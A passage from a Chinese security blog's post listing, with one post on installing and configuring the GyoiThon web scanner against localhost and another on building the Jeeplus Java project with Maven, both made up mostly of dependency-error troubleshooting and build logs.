<span class="nx">Requirement</span> <span class="nx">already</span> <span class="nx">satisfied</span><span class="p">:</span> <span class="nx">six</span><span class="o">&gt;=</span><span class="mf">1.5</span> <span class="k">in</span> <span class="sr">/usr/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">python2</span><span class="p">.</span><span class="mi">7</span><span class="o">/</span><span class="nx">dist</span><span class="o">-</span><span class="nx">packages</span> <span class="p">(</span><span class="k">from</span> <span class="nx">python</span><span class="o">-</span><span class="nx">dateutil</span><span class="o">&gt;=</span><span class="mf">2.5</span><span class="p">.</span><span class="mi">0</span><span class="o">-&gt;</span><span class="nx">pandas</span><span class="p">)</span> <span class="p">(</span><span class="mf">1.14</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

          <p><a href="/blog/2020/sk_learn/record/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/Lets/GyoiThon/"><h3 class="ctitle">「资产扫描」:Let's GyoiThon !</h3></a>
          <p><csmall>Jan 21, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p>title:GyoiThon Scanner</p>

<h2 id="1-下载依赖项">1 下载依赖项</h2>
<p>下载源文件后，进入文件夹路径，根据<code class="language-plaintext highlighter-rouge">python</code>的依赖进行安装，即<code class="language-plaintext highlighter-rouge">requirements.txt</code>文件：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">G</span><span class="p">:</span><span class="err">\</span><span class="nx">GyoiThon</span><span class="o">&gt;</span> <span class="nx">pip</span> <span class="nx">install</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">requirements</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">DEPRECATION</span><span class="p">:</span> <span class="nx">Python</span> <span class="mf">2.7</span> <span class="nx">will</span> <span class="nx">reach</span> <span class="nx">the</span> <span class="nx">end</span> <span class="k">of</span> <span class="nx">its</span> <span class="nx">life</span> <span class="nx">on</span> <span class="nx">January</span> <span class="mi">1</span><span class="nx">st</span><span class="p">,</span> <span class="mi">2020</span><span class="p">.</span> <span class="nx">Please</span> <span class="nx">upgrade</span> <span class="nx">your</span> <span class="nx">Python</span> <span class="k">as</span> <span class="nx">Python</span> <span class="mf">2.7</span> <span class="nx">won</span><span class="dl">'</span><span class="s1">t be maintained after that date. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support
Collecting beautifulsoup4&gt;=4.6.3
  Using cached https://files.pythonhosted.org/packages/c5/48/c88b0b390ae1f785942fc83413feb1268a1eb696f343d4d55db735b9bb39/beautifulsoup4-4.8.2-py2-none-any.whl
Requirement already satisfied: cchardet&gt;=2.1.4 in c:</span><span class="se">\</span><span class="s1">python27</span><span class="se">\</span><span class="s1">lib</span><span class="se">\</span><span class="s1">site-packages (from -r requirements.txt (line 2)) (2.1.5)
Collecting censys&gt;=0.0.8
  Using cached https://files.pythonhosted.org/packages/88/4b/3ca07679928c26bb5503b53c37e2f6eef2521289956e2c1bf74b64008afa/censys-0.0.8.tar.gz
Requirement already satisfied: docopt&gt;=0.6.2 in c:</span><span class="se">\</span><span class="s1">python27</span><span class="se">\</span><span class="s1">lib</span><span class="se">\</span><span class="s1">site-packages (from -r requirements.txt (line 4)) (0.6.2)
Collecting google-api-python-client&gt;=1.7.4
  Using cached https://files.pythonhosted.org/packages/31/c7/16ca16d28f2d71c8bd6fa67c91eb2a82259dc589c0504f903b675ecdaa84/google_api_python_client-1.7.11-py2-none-any.whl
Collecting Jinja2&gt;=2.10.1
  Using cached https://files.pythonhosted.org/packages/65/e0/eb35e762802015cab1ccee04e8a277b03f1d8e53da3ec3106882ec42558b/Jinja2-2.10.3-py2.py3-none-any.whl
ERROR: Could not find a version that satisfies the requirement matplotlib&gt;=3.0.3 (from -r requirements.txt (line 7)) (from versions: 0.86, 0.86.1, 0.86.2, 0.91.0, 0.91.1, 1.0.1, 1.1.0, 1.1.1, 1.2.0, 1.2.1, 1.3.0, 1.3.1, 1.4.0, 1.4.1rc1, 1.4.1, 1.4.2, 1.4.3, 1.5.0, 1.5.1, 1.5.2, 1.5.3, 2.0.0b1, 2.0.0b2, 2.0.0b3, 2.0.0b4, 2.0.0rc1, 2.0.0rc2, 2.0.0, 2.0.1, 2.0.2, 2.1.0rc1, 2.1.0, 2.1.1, 2.1.2, 2.2.0rc1, 2.2.0, 2.2.2, 2.2.3, 2.2.4)
ERROR: No matching distribution found for matplotlib&gt;=3.0.3 (from -r requirements.txt (line 7))
</span></code></pre></div></div>

<p>报错<code class="language-plaintext highlighter-rouge">ERROR: No matching distribution found for matplotlib&gt;=3.0.3 (from -r requirements.txt (line 7))</code>称没有找到匹配的版本，以为是pip的版本问题，所以进行pip版本升级。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">python</span> <span class="o">-</span><span class="nx">m</span> <span class="nx">pip</span> <span class="nx">install</span> <span class="o">--</span><span class="nx">upgrade</span> <span class="nx">pip</span>

<span class="nx">DEPRECATION</span><span class="p">:</span> <span class="nx">Python</span> <span class="mf">2.7</span> <span class="nx">will</span> <span class="nx">reach</span> <span class="nx">the</span> <span class="nx">end</span> <span class="k">of</span> <span class="nx">its</span> <span class="nx">life</span> <span class="nx">on</span> <span class="nx">January</span> <span class="mi">1</span><span class="nx">st</span><span class="p">,</span> <span class="mi">2020</span><span class="p">.</span> <span class="nx">Please</span> <span class="nx">upgrade</span> <span class="nx">your</span> <span class="nx">Python</span> <span class="k">as</span> <span class="nx">Python</span> <span class="mf">2.7</span> <span class="nx">won</span><span class="dl">'</span><span class="s1">t be maintained after that date. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support
Requirement already up-to-date: pip in c:</span><span class="se">\</span><span class="s1">python27</span><span class="se">\</span><span class="s1">lib</span><span class="se">\</span><span class="s1">site-packages (19.3.1)
</span></code></pre></div></div>

<h3 id="11-报错解决">1.1 报错解决</h3>

<p>但是依然无效，系统提示pip为最新版本。思索着应该是python的版本问题。直接就上python3
<br />使用<code class="language-plaintext highlighter-rouge">pip3</code>进行下载更新：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pip3</span> <span class="nx">install</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">requirements</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">i</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//pypi.douban.com/simple/ --trusted-host pypi.douban.com</span>

<span class="err">##</span><span class="nx">速度可以感受一下</span><span class="err">：</span>
<span class="nx">Looking</span> <span class="k">in</span> <span class="nx">indexes</span><span class="p">:</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//pypi.douban.com/simple/</span>
<span class="nx">Requirement</span> <span class="nx">already</span> <span class="nx">satisfied</span><span class="p">:</span> <span class="nx">beautifulsoup4</span><span class="o">&gt;=</span><span class="mf">4.6</span><span class="p">.</span><span class="mi">3</span> <span class="k">in</span> <span class="sr">/usr/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">python3</span><span class="o">/</span><span class="nx">dist</span><span class="o">-</span><span class="nx">packages</span> <span class="p">(</span><span class="k">from</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">requirements</span><span class="p">.</span><span class="nx">txt</span> <span class="p">(</span><span class="nx">line</span> <span class="mi">1</span><span class="p">))</span> <span class="p">(</span><span class="mf">4.8</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span>
<span class="nx">Collecting</span> <span class="nx">cchardet</span><span class="o">&gt;=</span><span class="mf">2.1</span><span class="p">.</span><span class="mi">4</span> <span class="p">(</span><span class="k">from</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">requirements</span><span class="p">.</span><span class="nx">txt</span> <span class="p">(</span><span class="nx">line</span> <span class="mi">2</span><span class="p">))</span>
  <span class="nx">Downloading</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//pypi.doubanio.com/packages/c6/20/905b6c5664736d884a40ac3b1204ab874c3c4a8ce86f7b2e28abc1fc6ee4/cchardet-2.1.5-cp37-cp37m-manylinux1_x86_64.whl (241kB)</span>
    <span class="mi">100</span><span class="o">%</span> <span class="o">|</span><span class="err">████████████████████████████████</span><span class="o">|</span> <span class="mi">245</span><span class="nx">kB</span> <span class="mf">6.9</span><span class="nx">MB</span><span class="o">/</span><span class="nx">s</span> 
<span class="nx">Collecting</span> <span class="nx">censys</span><span class="o">&gt;=</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">8</span> <span class="p">(</span><span class="k">from</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">requirements</span><span class="p">.</span><span class="nx">txt</span> <span class="p">(</span><span class="nx">line</span> <span class="mi">3</span><span class="p">))</span>

</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">-i $url --trust-host $host</code>此参数则是指定pip下载更新的url库。<br />
后来发现，requirements中，<code class="language-plaintext highlighter-rouge">matplotlib&gt;=3.0.3</code>这一项依赖需要<code class="language-plaintext highlighter-rouge">python3.6</code>版本以上，所以运行会报错。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">cat</span> <span class="o">/</span><span class="nx">media</span><span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">binAxin</span><span class="o">/</span><span class="nx">GyoiThon</span><span class="o">/</span><span class="nx">requirements</span><span class="p">.</span><span class="nx">txt</span> 
<span class="nx">beautifulsoup4</span><span class="o">&gt;=</span><span class="mf">4.6</span><span class="p">.</span><span class="mi">3</span>
<span class="nx">cchardet</span><span class="o">&gt;=</span><span class="mf">2.1</span><span class="p">.</span><span class="mi">4</span>
<span class="nx">censys</span><span class="o">&gt;=</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">8</span>
<span class="nx">docopt</span><span class="o">&gt;=</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">2</span>
<span class="nx">google</span><span class="o">-</span><span class="nx">api</span><span class="o">-</span><span class="nx">python</span><span class="o">-</span><span class="nx">client</span><span class="o">&gt;=</span><span class="mf">1.7</span><span class="p">.</span><span class="mi">4</span>
<span class="nx">Jinja2</span><span class="o">&gt;=</span><span class="mf">2.10</span><span class="p">.</span><span class="mi">1</span>
<span class="nx">matplotlib</span><span class="o">&gt;=</span><span class="mf">3.0</span><span class="p">.</span><span class="mi">3</span>
<span class="nx">msgpack</span><span class="o">-</span><span class="nx">python</span><span class="o">&gt;=</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">6</span>
<span class="nx">networkx</span><span class="o">&gt;=</span><span class="mf">2.2</span>
<span class="nx">pandas</span><span class="o">&gt;=</span><span class="mf">0.22</span><span class="p">.</span><span class="mi">0</span>
<span class="nx">pysocks</span><span class="o">&gt;=</span><span class="mf">1.6</span><span class="p">.</span><span class="mi">7</span>
<span class="nx">Scrapy</span><span class="o">&gt;=</span><span class="mf">1.5</span><span class="p">.</span><span class="mi">0</span>
<span class="nx">tldextract</span><span class="o">&gt;=</span><span class="mf">2.2</span><span class="p">.</span><span class="mi">1</span>
<span class="nx">urllib3</span><span class="o">&gt;=</span><span class="mf">1.25</span>
</code></pre></div></div>

<h2 id="2-扫描使用">2 扫描使用</h2>
<h3 id="21-配置host">2.1 配置host</h3>
<p>运行gyoithon后，会在<code class="language-plaintext highlighter-rouge">module</code>文件夹对CVE漏洞进行更新配置，此时我们等待即可。看一下简介：<br /></p>
<center><strong>GyoiThon是一款基于机器学习的渗透测试工具</strong></center>
<p><br />
GyoiThon根据学习数据识别安装在Web服务器上的软件（操作系统，中间件，框架，CMS等）。之后，GyoiThon为已识别的软件执行有效的攻击。最终，GyoiThon会自动生成扫描结果报告。<br /></p>

<p><br />上述处理均由GyoiThon自动执行；用户唯一的操作就是在GyoiThon中，输入目标web服务器的首页URL。这非常的简单，几乎不花费你任何的时间和精力，就能让你轻松的识别Web服务器上的漏洞。
所以GyoiThon需要一些识别项（特征库）进行匹配，下载完后，就可以使用扫描器了；需要注意的是，我们运行前需要对<code class="language-plaintext highlighter-rouge">host</code>文件进行配置</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="nx">ls</span>
<span class="nx">config</span><span class="p">.</span><span class="nx">ini</span>   <span class="nx">handout</span>   <span class="nx">LICENSE</span>  <span class="nx">__pycache__</span>  <span class="nx">requirements</span><span class="p">.</span><span class="nx">txt</span>  <span class="nx">util</span><span class="p">.</span><span class="nx">py</span>
<span class="nx">docker</span>       <span class="nx">host</span><span class="p">.</span><span class="nx">txt</span>  <span class="nx">logs</span>     <span class="nx">README</span><span class="p">.</span><span class="nx">md</span>    <span class="nx">signatures</span>        <span class="nx">util</span><span class="p">.</span><span class="nx">pyc</span>
<span class="nx">gyoithon</span><span class="p">.</span><span class="nx">py</span>  <span class="nx">img</span>       <span class="nx">modules</span>  <span class="nx">report</span>       <span class="nx">temp_signatures</span>

<span class="err">#</span> <span class="nx">cat</span> <span class="nx">host</span><span class="p">.</span><span class="nx">txt</span> 
<span class="nx">http</span> <span class="nx">localhost</span> <span class="mi">80</span> <span class="o">/</span>
</code></pre></div></div>
<p>如上，格式为：<br />
<code class="language-plaintext highlighter-rouge">协议&lt;空格&gt;url地址&lt;空格&gt;端口号&lt;空格&gt;路径</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">G</span><span class="p">:</span><span class="err">\</span><span class="nx">GyoiThon</span><span class="o">&gt;</span> <span class="nx">python3</span> <span class="p">.</span><span class="err">\</span><span class="nx">gyoithon</span><span class="p">.</span><span class="nx">py</span>

<span class="o">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
 <span class="err">██████╗██╗</span>   <span class="err">██╗</span> <span class="err">██████╗</span> <span class="err">██╗████████╗██╗</span>  <span class="err">██╗</span> <span class="err">██████╗</span> <span class="err">███╗</span>   <span class="err">██╗</span>
<span class="err">██╔════╝╚██╗</span> <span class="err">██╔╝██╔═══██╗██║╚══██╔══╝██║</span>  <span class="err">██║██╔═══██╗████╗</span>  <span class="err">██║</span>
<span class="err">██║</span>  <span class="err">███╗╚████╔╝</span> <span class="err">██║</span>   <span class="err">██║██║</span>   <span class="err">██║</span>   <span class="err">███████║██║</span>   <span class="err">██║██╔██╗</span> <span class="err">██║</span>
<span class="err">██║</span>   <span class="err">██║</span> <span class="err">╚██╔╝</span>  <span class="err">██║</span>   <span class="err">██║██║</span>   <span class="err">██║</span>   <span class="err">██╔══██║██║</span>   <span class="err">██║██║╚██╗██║</span>
<span class="err">╚██████╔╝</span>  <span class="err">██║</span>   <span class="err">╚██████╔╝██║</span>   <span class="err">██║</span>   <span class="err">██║</span>  <span class="err">██║╚██████╔╝██║</span> <span class="err">╚████║</span>
 <span class="err">╚═════╝</span>   <span class="err">╚═╝</span>    <span class="err">╚═════╝</span> <span class="err">╚═╝</span>   <span class="err">╚═╝</span>   <span class="err">╚═╝</span>  <span class="err">╚═╝</span> <span class="err">╚═════╝</span> <span class="err">╚═╝</span>  <span class="err">╚═══╝</span>  <span class="p">(</span><span class="nx">beta</span><span class="p">)</span>
<span class="o">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
<span class="nx">by</span> <span class="nx">gyoithon</span><span class="p">.</span><span class="nx">py</span>

       <span class="o">=</span><span class="p">[</span> <span class="nx">GyoiThon</span> <span class="nx">v0</span><span class="p">.</span><span class="mf">0.3</span><span class="o">-</span><span class="nx">beta</span>                               <span class="p">]</span><span class="o">=</span>
<span class="o">+</span> <span class="o">--</span> <span class="o">--=</span><span class="p">[</span> <span class="nx">Author</span>  <span class="p">:</span> <span class="nx">Gyoiler</span> <span class="p">(@</span><span class="nd">gyoithon</span><span class="p">)</span>                      <span class="p">]</span><span class="o">=--</span>
<span class="o">+</span> <span class="o">--</span> <span class="o">--=</span><span class="p">[</span> <span class="nx">Website</span> <span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/gyoisamurai/GyoiThon/ ]=--</span>
</code></pre></div></div>
<p>扫描完成后，扫描器就会出一个csv的报告查看即可。</p>

<p>以上。</p>

          <p><a href="/blog/2020/Lets/GyoiThon/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/maven/build/mavaProject/"><h3 class="ctitle">「代码审计」:Maven构建Jeeplus项目</h3></a>
          <p><csmall>Jan 19, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h3 id="1-maven构建">1. Maven构建</h3>
<p>第一步获取Maven构建的项目，只有用Maven构建的java项目，我们才能够Maven进行构建部署。<br />
下面这个是我用来练手的项目。自己也可以到github上找到。</p>

<p>此处Maven环境配置略过。多提一句，这里包括Maven的本地环境变量的配置和本地仓库的配置，自行问<code class="language-plaintext highlighter-rouge">度娘</code>。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#PS 进入你自己的Maven项目文件夹，我的是G:\yj-work\java-code\jeeplus-open</span>
PS C:<span class="se">\U</span>sers<span class="se">\本</span>阿信&gt; <span class="nb">cd </span>G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open
PS G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open&gt; <span class="nb">ls


    </span>目录: G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        2020/1/10     16:26                .idea
d-----         2020/1/9     11:03                .settings
d-----         2020/1/9     11:03                src
d-----         2020/1/9     11:03                target
<span class="nt">-a----</span>         2020/1/9     11:03           1350 .classpath
<span class="nt">-a----</span>         2020/1/9     11:03           1444 .project
<span class="nt">-a----</span>         2016/9/4      9:11          10252 LICENSE
<span class="nt">-a----</span>         2016/9/4      9:11          23054 pom.xml
<span class="nt">-a----</span>         2016/9/4      9:11            371 README.md
</code></pre></div></div>

<h4 id="11-effective-pom构建">1.1 effective-pom构建</h4>
<p>如上，关键pom属性；<br />
上面可以看到maven构建的pom.xml文件。输入命令<code class="language-plaintext highlighter-rouge">mvn help:effective-pom</code><br />
Maven 将会开始处理并显示 <code class="language-plaintext highlighter-rouge">effective-pom</code>。如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open&gt; mvn <span class="nb">help</span>:effective-pom
<span class="o">[</span>INFO] Scanning <span class="k">for </span>projects...
<span class="o">[</span>WARNING]
<span class="o">[</span>WARNING] Some problems were encountered <span class="k">while </span>building the effective model <span class="k">for </span>jeeplus:jeeplus:war:1.0.0-SNAPSHOT
<span class="o">[</span>WARNING] <span class="s1">'dependencies.dependency.(groupId:artifactId:type:classifier)'</span> must be unique: javax.servlet.jsp:jsp-api:jar -&gt; version 2.1 vs 2.2 @ line 278, column 21
<span class="o">[</span>WARNING]
<span class="o">[</span>WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.
<span class="o">[</span>WARNING]
<span class="o">[</span>WARNING] For this reason, future Maven versions might no longer support building such malformed projects.
<span class="o">[</span>WARNING]
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">--------------------------</span>&lt; jeeplus:jeeplus <span class="o">&gt;</span><span class="nt">---------------------------</span>
<span class="o">[</span>INFO] Building jeeplusx 1.0.0-SNAPSHOT
<span class="o">[</span>INFO] <span class="nt">--------------------------------</span><span class="o">[</span> war <span class="o">]</span><span class="nt">---------------------------------</span>
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-help-plugin:3.2.0:effective-pom <span class="o">(</span>default-cli<span class="o">)</span> @ jeeplus <span class="nt">---</span>
Downloading from alimaven: http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven-model/3.6.1/maven-model-3.6.1.pom
Downloaded from alimaven: http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven-model/3.6.1/maven-model-3.6.1.pom <span class="o">(</span>4.0 kB at 4.1 kB/s<span class="o">)</span>
Downloading from alimaven: http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven/3.6.1/maven-3.6.1.pom
Downloaded from alimaven: http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven/3.6.1/maven-3.6.1.pom <span class="o">(</span>24 kB at 95 kB/s<span class="o">)</span>

<span class="c">###################################################</span>
<span class="c">################中间具体下载过程略:&gt;##################</span>
<span class="c">###################################################</span>
</code></pre></div></div>

<p>我把这下面的部分，特意区分出来，方便看的更清楚，当我们对项目进行构建时，我们可以看到项目相关的一些元素。有的时候，当我们还是新手的时候，这样的控制台输出真的会令人激动！@-@</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sb">`</span>如下，maven回显出有关于jeeplus的Effective POMs<span class="sb">`</span>：
<span class="o">[</span>INFO]
Effective POMs, after inheritance, interpolation, and profiles are applied:

&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"GBK"</span>?&gt;
&lt;<span class="o">!</span><span class="nt">--</span> <span class="o">======================================================================</span> <span class="nt">--</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span>                                                                        <span class="nt">--</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span> Generated by Maven Help Plugin on 2020-01-19T15:52:57+08:00            <span class="nt">--</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span> See: http://maven.apache.org/plugins/maven-help-plugin/                <span class="nt">--</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span>                                                                        <span class="nt">--</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span> <span class="o">======================================================================</span> <span class="nt">--</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span> <span class="o">======================================================================</span> <span class="nt">--</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span>                                                                        <span class="nt">--</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span> Effective POM <span class="k">for </span>project <span class="s1">'jeeplus:jeeplus:war:1.0.0-SNAPSHOT'</span>         <span class="nt">--</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span>                                                                        <span class="nt">--</span><span class="o">&gt;</span>
&lt;<span class="o">!</span><span class="nt">--</span> <span class="o">======================================================================</span> <span class="nt">--</span><span class="o">&gt;</span>

<span class="c">###################################################</span>
<span class="c">######中间具体groupid、artifactid等配置略:&gt;###########</span>
<span class="c">###################################################</span>

<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] BUILD SUCCESS
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] Total <span class="nb">time</span>:  12.235 s
<span class="o">[</span>INFO] Finished at: 2020-01-19T15:53:00+08:00
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>
<p>在上面的<code class="language-plaintext highlighter-rouge">pom.xml</code>中可以看到 <code class="language-plaintext highlighter-rouge">Maven</code> 在执行目标时需要用到的默认工程源码目录结构、输出目录、需要的插件、仓库和报表目录。Maven 的 pom.xml 文件也不需要手工编写。Maven 提供了大量的原型插件来创建工程，包括工程结构和<code class="language-plaintext highlighter-rouge">pom.xml</code>。</p>

<h3 id="2-properties文件配置">2 properties文件配置</h3>
<p>进入jeeplus项目，根据自己电脑的不同环境，对properties文件进行配置,自定义配置sql数据如<code class="language-plaintext highlighter-rouge">\src\main\resources\jeeplus.properties</code>；比如本地运行的为mysql数据库，我单单把mysql数据库的配置代码贴出来，如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#mysql database setting</span>
jdbc.type<span class="o">=</span>mysql
jdbc.driver<span class="o">=</span>com.mysql.jdbc.Driver
jdbc.url<span class="o">=</span>jdbc:mysql://localhost:3306/jeeplus_schema?useUnicode<span class="o">=</span><span class="nb">true</span>&amp;characterEncoding<span class="o">=</span>utf-8
jdbc.username<span class="o">=</span>root
jdbc.password<span class="o">=</span>root
</code></pre></div></div>
<p>把mysql数据库的账号密码设置成本地的数据库账号密码就好，比如我本地的mysql账号密码均为<code class="language-plaintext highlighter-rouge">root</code>,填上正确即可，不然会报错。然后打开<code class="language-plaintext highlighter-rouge">mysqld</code>，下一步就进行maven构建。</p>

<h3 id="3-maven测试">3 maven测试</h3>

<h4 id="31-test">3.1 test</h4>

<p>输入<code class="language-plaintext highlighter-rouge">mvn test</code>，查看maven构建java项目是否存在报错：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open&gt; mvn <span class="nb">test</span>
<span class="o">[</span>INFO] Scanning <span class="k">for </span>projects...
<span class="o">[</span>WARNING]
<span class="o">[</span>WARNING] Some problems were encountered <span class="k">while </span>building the effective model <span class="k">for </span>jeeplus:jeeplus:war:1.0.0-SNAPSHOT
<span class="o">[</span>WARNING] <span class="s1">'dependencies.dependency.(groupId:artifactId:type:classifier)'</span> must be unique: javax.servlet.jsp:jsp-api:jar -&gt; version 2.1 vs 2.2 @ line 278, column 21
<span class="o">[</span>WARNING]
<span class="o">[</span>WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.
<span class="o">[</span>WARNING]
<span class="o">[</span>WARNING] For this reason, future Maven versions might no longer support building such malformed projects.
<span class="o">[</span>WARNING]
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">--------------------------</span>&lt; jeeplus:jeeplus <span class="o">&gt;</span><span class="nt">---------------------------</span>
<span class="o">[</span>INFO] Building jeeplusx 1.0.0-SNAPSHOT
<span class="o">[</span>INFO] <span class="nt">--------------------------------</span><span class="o">[</span> war <span class="o">]</span><span class="nt">---------------------------------</span>
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-resources-plugin:2.6:resources <span class="o">(</span>default-resources<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] Using <span class="s1">'UTF-8'</span> encoding to copy filtered resources.
<span class="o">[</span>INFO] Copying 65 resources
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-compiler-plugin:3.3:compile <span class="o">(</span>default-compile<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] Changes detected - recompiling the module!
<span class="o">[</span>INFO] Compiling 258 <span class="nb">source </span>files to G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open<span class="se">\t</span>arget<span class="se">\c</span>lasses
<span class="o">[</span>INFO] /G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java: 某些输入文件使用或覆盖了已过时的 API。
<span class="o">[</span>INFO] /G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java: 有关详细信息, 请使用 <span class="nt">-Xlint</span>:deprecation 重新编译。
<span class="o">[</span>INFO] /G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java: 某些输入文件使用了未经检查或不安全的操作。
<span class="o">[</span>INFO] /G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java: 有关详细信息, 请使用 <span class="nt">-Xlint</span>:unchecked 重新编译。
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-resources-plugin:2.6:testResources <span class="o">(</span>default-testResources<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] Using <span class="s1">'UTF-8'</span> encoding to copy filtered resources.
<span class="o">[</span>INFO] skip non existing resourceDirectory G:<span class="se">\y</span>j-work<span class="se">\j</span>ava-code<span class="se">\j</span>eeplus-open<span class="se">\s</span>rc<span class="se">\t</span>est<span class="se">\r</span>esources
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-compiler-plugin:3.3:testCompile <span class="o">(</span>default-testCompile<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] No sources to compile
<span class="o">[</span>INFO]
<span class="o">[</span>INFO] <span class="nt">---</span> maven-surefire-plugin:2.12.4:test <span class="o">(</span>default-test<span class="o">)</span> @ jeeplus <span class="nt">---</span>
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] BUILD SUCCESS
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
<span class="o">[</span>INFO] Total <span class="nb">time</span>:  10.063 s
<span class="o">[</span>INFO] Finished at: 2020-01-19T16:46:53+08:00
<span class="o">[</span>INFO] <span class="nt">------------------------------------------------------------------------</span>
</code></pre></div></div>

<h3 id="32-clean-package">3.2 clean package</h3>
